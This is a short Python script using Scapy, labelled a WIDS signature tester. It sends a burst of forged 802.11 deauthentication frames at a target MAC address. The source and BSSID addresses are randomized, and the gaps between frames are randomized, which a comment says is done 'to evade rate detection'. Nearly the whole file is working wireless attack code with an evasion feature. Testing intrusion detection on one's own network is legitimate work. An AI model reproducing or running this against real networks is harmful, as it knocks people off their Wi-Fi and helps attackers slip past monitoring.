#!/usr/bin/env python3
"""WIDS signature tester - inject benign-looking attack frames."""
import argparse, random, time
from scapy.all import *

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", default="wlan0mon")
    parser.add_argument("-t", "--target", default="00:11:22:33:44:55")
    args = parser.parse_args()
    
    # Inject deauth with varying intervals to evade rate detection
    for _ in range(10):
        pkt = RadioTap() / Dot11(addr1=args.target, addr2=RandMAC(), addr3=RandMAC()) / Dot11Deauth(reason=7)
        sendp(pkt, iface=args.iface, verbose=0)
        time.sleep(random.uniform(0.5, 3.0))
    print("[*] WIDS evasion test complete")

if __name__ == "__main__":
    main()
